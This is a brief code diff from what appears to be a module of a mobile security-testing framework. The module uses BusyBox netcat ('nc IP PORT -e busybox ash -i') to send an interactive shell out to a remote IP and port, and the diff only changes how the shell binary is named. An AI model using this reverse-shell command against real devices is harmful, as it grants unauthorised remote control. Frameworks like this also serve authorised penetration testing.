@@ -18,7 +18,7 @@ This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send an AS
 
     def execute(self, arguments):
         if self.isBusyBoxInstalled():
-            self.busyBoxExec("nc " + arguments.ip + " " + arguments.port + " -e $BB ash -i")
+            self.busyBoxExec("nc " + arguments.ip + " " + arguments.port + " -e busybox ash -i")
         else:
             self.stderr.write("This command requires BusyBox to complete. Run tools.setup.busybox and then retry.\n")
             
